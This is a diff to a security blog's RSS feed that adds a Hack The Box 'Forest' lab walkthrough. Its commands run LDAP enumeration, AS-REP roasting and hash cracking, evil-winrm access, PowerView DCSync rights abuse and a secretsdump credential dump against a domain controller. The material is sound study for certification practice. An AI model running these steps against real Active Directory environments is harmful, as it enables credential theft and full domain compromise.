@@ -1,4 +1,261 @@
-<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>LDAP on ikuamike</title><link>https://blog.ikuamike.io/tags/ldap/</link><description>Recent content in LDAP on ikuamike</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><copyright>© Michael Ikua</copyright><lastBuildDate>Wed, 17 Feb 2021 21:54:20 +0300</lastBuildDate><atom:link href="https://blog.ikuamike.io/tags/ldap/index.xml" rel="self" type="application/rss+xml"/><item><title>Vulnhub: Symfonos 5</title><link>https://blog.ikuamike.io/posts/2021/symfonos5/</link><pubDate>Wed, 17 Feb 2021 21:54:20 +0300</pubDate><guid>https://blog.ikuamike.io/posts/2021/symfonos5/</guid><description/><content>&lt;img src="https://blog.ikuamike.io/img/symfonos1/symfonos1.png" alt="symfonos" class="center" style="border-radius: 8px;" />
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>LDAP on ikuamike</title><link>https://blog.ikuamike.io/tags/ldap/</link><description>Recent content in LDAP on ikuamike</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><copyright>© Michael Ikua</copyright><lastBuildDate>Fri, 25 Feb 2022 00:00:00 +0000</lastBuildDate><atom:link href="https://blog.ikuamike.io/tags/ldap/index.xml" rel="self" type="application/rss+xml"/><item><title>Hack The Box: Forest</title><link>https://blog.ikuamike.io/posts/2022/forest-htb/</link><pubDate>Fri, 25 Feb 2022 00:00:00 +0000</pubDate><guid>https://blog.ikuamike.io/posts/2022/forest-htb/</guid><description/><content>&lt;img src="https://blog.ikuamike.io/img/forest/logo.png" class="center" style="border-radius: 8px;" />
+&lt;h2 id="introduction">Introduction&lt;/h2>
+&lt;p>After passing my OSCP, I am planning on doing CRTP and CRTO sometime this year. I took the OSCP exam before the updates that are focused on Active
+Directory so I didn&amp;rsquo;t actively focus on this area.&lt;/p>
+&lt;p>So to learn and practice on AD and Windows and also as some prep for the certifications I plan on taking, I will be doing some machines that are AD
+related and try to get into the details of the included misconfigurations and vulnerabilities.&lt;/p>
+&lt;p>For this writeup I am looking at Forest from HTB. There are many writeups on this so I will use them as references for learning.&lt;/p>
+&lt;h2 id="enumeration">Enumeration&lt;/h2>
+&lt;p>Open ports as found by nmap.&lt;/p>
+&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">Nmap scan report &lt;span style="color:#66d9ef">for&lt;/span> 10.10.10.161
+Host is up &lt;span style="color:#f92672">(&lt;/span>0.20s latency&lt;span style="color:#f92672">)&lt;/span>.
+PORT STATE SERVICE VERSION
+53/tcp open domain Simple DNS Plus
+88/tcp open kerberos-sec Microsoft Windows Kerberos &lt;span style="color:#f92672">(&lt;/span>server time: 2022-02-25 16:32:33Z&lt;span style="color:#f92672">)&lt;/span>
+135/tcp open msrpc Microsoft Windows RPC
+139/tcp open netbios-ssn Microsoft Windows netbios-ssn
+389/tcp open ldap Microsoft Windows Active Directory LDAP &lt;span style="color:#f92672">(&lt;/span>Domain: htb.local, Site: Default-First-Site-Name&lt;span style="color:#f92672">)&lt;/span>
+445/tcp open microsoft-ds Windows Server &lt;span style="color:#ae81ff">2016&lt;/span> Standard &lt;span style="color:#ae81ff">14393&lt;/span> microsoft-ds &lt;span style="color:#f92672">(&lt;/span>workgroup: HTB&lt;span style="color:#f92672">)&lt;/span>
+464/tcp open kpasswd5?
+593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0
+636/tcp open tcpwrapped
+3268/tcp open ldap Microsoft Windows Active Directory LDAP &lt;span style="color:#f92672">(&lt;/span>Domain: htb.local, Site: Default-First-Site-Name&lt;span style="color:#f92672">)&lt;/span>
+3269/tcp open tcpwrapped
+5985/tcp open http Microsoft HTTPAPI httpd 2.0 &lt;span style="color:#f92672">(&lt;/span>SSDP/UPnP&lt;span style="color:#f92672">)&lt;/span>
+|_http-title: Not Found
+|_http-server-header: Microsoft-HTTPAPI/2.0
+9389/tcp open mc-nmf .NET Message Framing
+47001/tcp open http Microsoft HTTPAPI httpd 2.0 &lt;span style="color:#f92672">(&lt;/span>SSDP/UPnP&lt;span style="color:#f92672">)&lt;/span>
+|_http-title: Not Found
+|_http-server-header: Microsoft-HTTPAPI/2.0
+49664/tcp open msrpc Microsoft Windows RPC
+49665/tcp open msrpc Microsoft Windows RPC
+49666/tcp open msrpc Microsoft Windows RPC
+49667/tcp open msrpc Microsoft Windows RPC
+49671/tcp open msrpc Microsoft Windows RPC
+49676/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0
+49677/tcp open msrpc Microsoft Windows RPC
+49684/tcp open msrpc Microsoft Windows RPC
+49703/tcp open msrpc Microsoft Windows RPC
+49945/tcp open msrpc Microsoft Windows RPC
+Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows
+Host script results:
+| smb2-time:
+| date: 2022-02-25T16:33:28
+|_ start_date: 2022-02-25T16:25:55
+| smb2-security-mode:
+| 3.1.1:
+|_ Message signing enabled and required
+| smb-security-mode:
+| account_used: &amp;lt;blank&amp;gt;
+| authentication_level: user
+| challenge_response: supported
+|_ message_signing: required
+|_clock-skew: mean: 2h52m14s, deviation: 4h37m09s, median: 12m13s
+| smb-os-discovery:
+| OS: Windows Server &lt;span style="color:#ae81ff">2016&lt;/span> Standard &lt;span style="color:#ae81ff">14393&lt;/span> &lt;span style="color:#f92672">(&lt;/span>Windows Server &lt;span style="color:#ae81ff">2016&lt;/span> Standard 6.3&lt;span style="color:#f92672">)&lt;/span>
+| Computer name: FOREST
+| NetBIOS computer name: FOREST&lt;span style="color:#ae81ff">\x&lt;/span>&lt;span style="color:#ae81ff">00&lt;/span>
+| Domain name: htb.local
+| Forest name: htb.local
+| FQDN: FOREST.htb.local
+|_ System time: 2022-02-25T08:33:27-08:00
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>From the results we see some notable ports (88,389) that point to us that this is a domain controller. From ldap we see the domain is &lt;strong>htb.local&lt;/strong> and
+from smb the computer name is &lt;strong>FOREST&lt;/strong>.&lt;/p>
+&lt;h3 id="ldap-null-bind">LDAP Null bind&lt;/h3>
+&lt;p>LDAP null bind is allowed on this machine allowing us to make ldap queries without authentication. Something to note this is not a default configuration
+for Windows AD, you have to set this up manually.&lt;/p>
+&lt;p>By running nmap ldap scripts against the machine alot of the ldap information is dumped. I have cut most off the output.&lt;/p>
+&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">Nmap scan report &lt;span style="color:#66d9ef">for&lt;/span> 10.10.10.161
+Host is up &lt;span style="color:#f92672">(&lt;/span>0.20s latency&lt;span style="color:#f92672">)&lt;/span>.
+PORT STATE SERVICE VERSION
+389/tcp open ldap Microsoft Windows Active Directory LDAP &lt;span style="color:#f92672">(&lt;/span>Domain: htb.local, Site: Default-First-Site-Name&lt;span style="color:#f92672">)&lt;/span>
+| ldap-search:
+| Context: DC&lt;span style="color:#f92672">=&lt;/span>htb,DC&lt;span style="color:#f92672">=&lt;/span>local
+| dn: DC&lt;span style="color:#f92672">=&lt;/span>htb,DC&lt;span style="color:#f92672">=&lt;/span>local
+| objectClass: top
+| objectClass: domain
+| objectClass: domainDNS
+| distinguishedName: DC&lt;span style="color:#f92672">=&lt;/span>htb,DC&lt;span style="color:#f92672">=&lt;/span>local
+| instanceType: &lt;span style="color:#ae81ff">5&lt;/span>
+| whenCreated: 2019/09/18 17:45:49 UTC
+| whenChanged: 2022/02/25 16:25:45 UTC
+| subRefs: DC&lt;span style="color:#f92672">=&lt;/span>ForestDnsZones,DC&lt;span style="color:#f92672">=&lt;/span>htb,DC&lt;span style="color:#f92672">=&lt;/span>local
+| subRefs: DC&lt;span style="color:#f92672">=&lt;/span>DomainDnsZones,DC&lt;span style="color:#f92672">=&lt;/span>htb,DC&lt;span style="color:#f92672">=&lt;/span>local
+| subRefs: CN&lt;span style="color:#f92672">=&lt;/span>Configuration,DC&lt;span style="color:#f92672">=&lt;/span>htb,DC&lt;span style="color:#f92672">=&lt;/span>local
+--- snip ---
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>We can also confirm this using ldapsearch and we see all ldap information.&lt;/p>
+&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">ldapsearch -h 10.10.10.161 -x -b &lt;span style="color:#e6db74">&amp;#34;DC=htb,DC=local&amp;#34;&lt;/span>
+&lt;/code>&lt;/pre>&lt;/div>
+&lt;img src="https://blog.ikuamike.io/img/forest/forest1.png" class="center" style="border-radius: 8px;" />
+&lt;p>Since the output is quite verbose and not easy to digest I&amp;rsquo;ll use &lt;strong>windapsearch&lt;/strong> which is a nicer tool that helps with ldap information.&lt;/p>
+&lt;h4 id="users">Users&lt;/h4>
+&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">windapsearch -d htb.local --dc 10.10.10.161 -m users --attrs samaccountname | grep -i samaccountname | awk &lt;span style="color:#e6db74">&amp;#39;{print $2}&amp;#39;&lt;/span>
+&lt;/code>&lt;/pre>&lt;/div>&lt;pre>&lt;code>SM_ca8c2ed5bdab4dc9b
+SM_75a538d3025e4db9a
+$331000-VK4ADACQNUCA
+SM_2c8eef0a09b545acb
+Guest
+DefaultAccount
+SM_681f53d4942840e18
+SM_1ffab36a2f5f479cb
+HealthMailboxc3d7722
+SM_9b69f1b9d2cc45549
+SM_7c96b981967141ebb
+SM_c75ee099d0a64c91b
+SM_1b41c9286325456bb
+HealthMailboxfc9daad
+HealthMailboxc0a90c9
+HealthMailbox670628e
+HealthMailbox968e74d
+HealthMailbox6ded678
+HealthMailboxb01ac64
+HealthMailbox7108a4e
+HealthMailbox0659cc1
+HealthMailbox83d6781
+mark
+lucinda
+santi
+andy
+HealthMailboxfd87238
+sebastien
+&lt;/code>&lt;/pre>&lt;h4 id="computers">Computers&lt;/h4>
+&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">windapsearch -d htb.local --dc 10.10.10.161 -m computers
+&lt;/code>&lt;/pre>&lt;/div>&lt;pre>&lt;code>dn: CN=FOREST,OU=Domain Controllers,DC=htb,DC=local
+cn: FOREST
+operatingSystem: Windows Server 2016 Standard
+operatingSystemVersion: 10.0 (14393)
+dNSHostName: FOREST.htb.local
+dn: CN=EXCH01,CN=Computers,DC=htb,DC=local
+cn: EXCH01
+operatingSystem: Windows Server 2016 Standard
+operatingSystemVersion: 10.0 (14393)
+dNSHostName: EXCH01.htb.local
+&lt;/code>&lt;/pre>&lt;h4 id="groups">Groups&lt;/h4>
+&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">windapsearch -d htb.local --dc 10.10.10.161 -m groups | grep cn | awk -F&lt;span style="color:#ae81ff">\:&lt;/span> &lt;span style="color:#e6db74">&amp;#39;{print $2}&amp;#39;&lt;/span>
+&lt;/code>&lt;/pre>&lt;/div>&lt;pre>&lt;code>--- snip ---
+Key Admins
+Enterprise Key Admins
+Organization Management
+Recipient Management
+UM Management
+Help Desk
+Discovery Management
+Records Management
+Public Folder Management
+Server Management
+View-Only Organization Management
+Delegated Setup
+Security Reader
+Hygiene Management
+Security Administrator
+Compliance Management
+Exchange Servers
+Exchange Trusted Subsystem
+Managed Availability Servers
+Exchange Windows Permissions
+ExchangeLegacyInterop
+Exchange Install Domain Servers
+test
+&lt;/code>&lt;/pre>&lt;p>We can go on and on with enumeration but you get the point. From the user accounts list and computers we can see presence of an
+Exchange server in the domain, keep this in mind it will be important later.&lt;/p>
+&lt;p>At this point we don&amp;rsquo;t yet have any actionable information that could help us get a foothold.&lt;/p>
+&lt;h2 id="as-rep-roasting">AS-REP Roasting&lt;/h2>
+&lt;p>This attack has been well covered on other posts online, I&amp;rsquo;ll list ones that I like as references.&lt;/p>
+&lt;p>We&amp;rsquo;ll use GetNPUsers script from impacket to perform the attack. This script also makes ldap queries to identify users vulnerable to
+the attack.&lt;/p>
+&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">GetNPUsers.py -request -dc-ip 10.10.10.161 htb.local/
+&lt;/code>&lt;/pre>&lt;/div>
+&lt;img src="https://blog.ikuamike.io/img/forest/forest2.png" class="center" style="border-radius: 8px;" />
+&lt;p>Using the output, I was able to crack the hash with john and get the user&amp;rsquo;s password.&lt;/p>
+&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">john --wordlist&lt;span style="color:#f92672">=&lt;/span>/usr/share/wordlists/rockyou.txt svc-alfresco.txt
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;strong>svc-alfresco : s3rvice&lt;/strong>&lt;/p>
+&lt;h2 id="shell-as-svc-alfresco">Shell as svc-alfresco&lt;/h2>
+&lt;p>With the discovered credentials we can get a shell, to confirm that we can use this user to get a shell I will use crackmapexec.&lt;/p>
+&lt;img src="https://blog.ikuamike.io/img/forest/forest3.png" class="center" style="border-radius: 8px;" />
+&lt;p>CME confirms we can connect via winrm.&lt;/p>
+&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">evil-winrm -i 10.10.10.161 -u svc-alfresco -p s3rvice
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>Once we have a shell we can look at group memberships for this account.&lt;/p>
+&lt;img src="https://blog.ikuamike.io/img/forest/forest4.png" class="center" style="border-radius: 8px;" />
+&lt;p>From the output we see we are part of several interesting non-default groups.&lt;/p>
+&lt;ol>
+&lt;li>Remote Management Users - Builtin&lt;/li>
+&lt;li>Account Operators - Builtin&lt;/li>
+&lt;li>Privileged IT Accounts - Custom&lt;/li>
+&lt;li>Service Accounts - Custom&lt;/li>
+&lt;/ol>
+&lt;p>We know the Remote Management Users group is the one that allowed us winrm access.&lt;/p>
+&lt;h3 id="domain-enumeration-with-bloodhound">Domain Enumeration with Bloodhound&lt;/h3>
+&lt;p>Since this is a domain controller we can try to find the privilege escalation path using domain information. This is
+where bloodhound will come in handy. If you haven&amp;rsquo;t use bloodhound against your AD environment, you should!&lt;/p>
+&lt;blockquote>
+&lt;p>BloodHound uses graph theory to reveal the hidden and often unintended relationships within an Active Directory or Azure environment.
+Attackers can use BloodHound to easily identify highly complex attack paths that would otherwise be impossible to quickly identify.&lt;/p>
+&lt;p>Source - BloodHound Github page&lt;/p>
+&lt;/blockquote>
+&lt;p>I recommend you use &lt;a href="https://github.com/BloodHoundAD/BloodHound/releases/tag/4.0.3" target="_blank" rel="noopener">release 4.0.3&lt;/a>
+. For some reason the latest release 4.1.0 (at the time
+of writing) didn&amp;rsquo;t work well for me.&lt;/p>
+&lt;p>All you need to do is upload SharpHound.exe to the Forest machine, execute it, download the created zip file and upload it to Bloodhound.&lt;/p>
+&lt;p>Once uploaded, search for our user svc-alfresco and mark them as owned.&lt;/p>
+&lt;img src="https://blog.ikuamike.io/img/forest/forest6.png" class="center" style="border-radius: 8px;" />
+&lt;p>From there we can try uncover an possible attack path that will lead us to DA. The Pre-Built queries from BloodHound are quite useful. In our case the
+&lt;strong>&amp;ldquo;Shortest Paths to Domain Admins from Owned Principals&amp;rdquo;&lt;/strong> will give us a useful path.&lt;/p>
+&lt;img src="https://blog.ikuamike.io/img/forest/forest7.png" class="center" style="border-radius: 8px;" />
+&lt;p>We will get the below graph showing the path to Domain Admin, I have rearranged the nodes for easier view.&lt;/p>
+&lt;img src="https://blog.ikuamike.io/img/forest/forest5.png" class="center" style="border-radius: 8px;" />
+&lt;p>We see the &lt;strong>Account Operators&lt;/strong> group has &lt;em>GenericAll&lt;/em> permissions on &lt;strong>Exchange Windows Permissions&lt;/strong> Group.&lt;/p>
+&lt;h3 id="account-operators-group">Account Operators Group&lt;/h3>
+&lt;p>By looking at &lt;a href="https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#account-operators" target="_blank" rel="noopener">Microsoft documentation&lt;/a>
+;&lt;/p>
+&lt;blockquote>
+&lt;p>The Account Operators group grants limited account creation privileges to a user. Members of this group can create and modify most types of accounts, including those of users,
+local groups, and global groups, and members can log in locally to domain controllers.&lt;/p>
+&lt;p>Members of the Account Operators group cannot manage the Administrator user account, the user accounts of administrators, or the Administrators, Server Operators, Account Operators,
+Backup Operators, or Print Operators groups. Members of this group cannot modify user rights.&lt;/p>
+&lt;/blockquote>
+&lt;p>From the above information, we see that the Account Operators group has permission to create and modify any groups except those listed. Since the Exchange Windows Permissions group
+isn&amp;rsquo;t part of this list, it becomes modifiable by default.&lt;/p>
+&lt;h3 id="exchange-windows-permissions-group">Exchange Windows Permissions Group&lt;/h3>
+&lt;p>Remember the presence of Exchange? When installing Exchange, by default the permissions granted on the domain are too high (I think this is now patched on 2019 version, not sure). When Exchange
+is installed, the Exchange Windows Permissions Group has WriteDACL access to the Domain.&lt;/p>
+&lt;p>See this article that goes in depth on the subject. &lt;a href="https://adsecurity.org/?p=4119" target="_blank" rel="noopener">https://adsecurity.org/?p=4119&lt;/a>
+&lt;/p>
+&lt;p>The Exchange Trusted Subsystem Group can also be used as it is a member of the Exchange Windows Permissions Group.&lt;/p>
+&lt;p>Now we can chain these two issues to compromise the domain.&lt;/p>
+&lt;h2 id="owning-the-domain">Owning the Domain&lt;/h2>
+&lt;p>First we&amp;rsquo;ll use our Account Operator privileges as svc-alfresco to create an account and add it the Exchange Windows Permissions Group.&lt;/p>
+&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">net user pwned &lt;span style="color:#e6db74">&amp;#39;Pwn3d!!&amp;#39;&lt;/span> /add
+net group &lt;span style="color:#e6db74">&amp;#34;Exchange Windows Permissions&amp;#34;&lt;/span> pwned /add
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>We can then upload PowerView and use it to grant DCSync privileges to the newly created account.&lt;/p>
+&lt;p>The below commands will allow powerview to use the credentials of the new account to grant the privileges on that account.
+We could also use the svc-alfresco account if we wanted.&lt;/p>
+&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">$SecPassword &lt;span style="color:#f92672">=&lt;/span> ConvertTo-SecureString &lt;span style="color:#e6db74">&amp;#39;Pwn3d!!&amp;#39;&lt;/span> -AsPlainText -Force
+$Cred &lt;span style="color:#f92672">=&lt;/span> New-Object System.Management.Automation.PSCredential&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#39;htb.local\pwned&amp;#39;&lt;/span>, $SecPassword&lt;span style="color:#f92672">)&lt;/span>
+Add-DomainObjectAcl -Credential $Cred -TargetDomain htb.local -PrincipalIdentity &lt;span style="color:#e6db74">&amp;#39;pwned&amp;#39;&lt;/span> -Rights DCSync
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>With that being successful, we can perform DCSync with secretsdump impacket script and get the administrator hash.&lt;/p>
+&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">secretsdump.py htb.local/pwned:&lt;span style="color:#e6db74">&amp;#39;Pwn3d!!&amp;#39;&lt;/span>@10.10.10.161
+&lt;/code>&lt;/pre>&lt;/div>
+&lt;img src="https://blog.ikuamike.io/img/forest/forest9.png" class="center" style="border-radius: 8px;" />
+&lt;p>We can then use the admin hash to get a shell.&lt;/p>
+&lt;h2 id="extras">Extras&lt;/h2>
+&lt;p>Todo - LDAP queries&lt;/p>
+&lt;h2 id="references">References&lt;/h2>
+&lt;p>&lt;strong>AS-REP Roasting&lt;/strong>&lt;/p>
+&lt;p>&lt;a href="https://www.securitynik.com/2022/01/beginning-as-rep-roasting-with-impacket.html">https://www.securitynik.com/2022/01/beginning-as-rep-roasting-with-impacket.html&lt;/a>&lt;/p>
+&lt;p>&lt;a href="https://jsecurity101.medium.com/ioc-differences-between-kerberoasting-and-as-rep-roasting-4ae179cdf9ec">https://jsecurity101.medium.com/ioc-differences-between-kerberoasting-and-as-rep-roasting-4ae179cdf9ec&lt;/a>&lt;/p>
+&lt;p>&lt;a href="https://blog.xpnsec.com/kerberos-attacks-part-2/">https://blog.xpnsec.com/kerberos-attacks-part-2/&lt;/a>&lt;/p>
+&lt;p>&lt;strong>Exchange and ACL Stuff&lt;/strong>&lt;/p>
+&lt;p>&lt;a href="https://www.blackhat.com/docs/us-17/wednesday/us-17-Robbins-An-ACE-Up-The-Sleeve-Designing-Active-Directory-DACL-Backdoors-wp.pdf">https://www.blackhat.com/docs/us-17/wednesday/us-17-Robbins-An-ACE-Up-The-Sleeve-Designing-Active-Directory-DACL-Backdoors-wp.pdf&lt;/a>&lt;/p>
+&lt;p>&lt;a href="https://dirkjanm.io/abusing-exchange-one-api-call-away-from-domain-admin/">https://dirkjanm.io/abusing-exchange-one-api-call-away-from-domain-admin/&lt;/a>&lt;/p>
+&lt;p>&lt;a href="https://support.microsoft.com/en-us/topic/reducing-permissions-required-to-run-exchange-server-when-you-use-the-shared-permissions-model-e1972d47-d714-fd76-1fd5-7cdcb85408ed">https://support.microsoft.com/en-us/topic/reducing-permissions-required-to-run-exchange-server-when-you-use-the-shared-permissions-model-e1972d47-d714-fd76-1fd5-7cdcb85408ed&lt;/a>&lt;/p>
+&lt;p>&lt;a href="https://pentestlab.blog/2019/09/12/microsoft-exchange-acl/">https://pentestlab.blog/2019/09/12/microsoft-exchange-acl/&lt;/a>&lt;/p>
+&lt;p>&lt;a href="https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/">https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/&lt;/a>&lt;/p>
+&lt;p>&lt;a href="https://github.com/gdedrouas/Exchange-AD-Privesc/blob/master/DomainObject/DomainObject.md">https://github.com/gdedrouas/Exchange-AD-Privesc/blob/master/DomainObject/DomainObject.md&lt;/a>&lt;/p>
+&lt;p>&lt;strong>Other Forest Walkthroughs&lt;/strong>&lt;/p>
+&lt;p>&lt;a href="https://0xdf.gitlab.io/2020/03/21/htb-forest.html">https://0xdf.gitlab.io/2020/03/21/htb-forest.html&lt;/a>&lt;/p>
+&lt;p>&lt;a href="https://www.youtube.com/watch?v=H9FcE_FMZio&amp;amp;t=3755s">https://www.youtube.com/watch?v=H9FcE_FMZio&amp;amp;t=3755s&lt;/a>&lt;/p>
+&lt;p>&lt;a href="https://vulndev.io/2020/03/21/forest-hackthebox/">https://vulndev.io/2020/03/21/forest-hackthebox/&lt;/a>&lt;/p></content></item><item><title>Vulnhub: Symfonos 5</title><link>https://blog.ikuamike.io/posts/2021/symfonos5/</link><pubDate>Wed, 17 Feb 2021 21:54:20 +0300</pubDate><guid>https://blog.ikuamike.io/posts/2021/symfonos5/</guid><description/><content>&lt;img src="https://blog.ikuamike.io/img/symfonos1/symfonos1.png" alt="symfonos" class="center" style="border-radius: 8px;" />
 &lt;table>
 &lt;thead>
 &lt;tr>
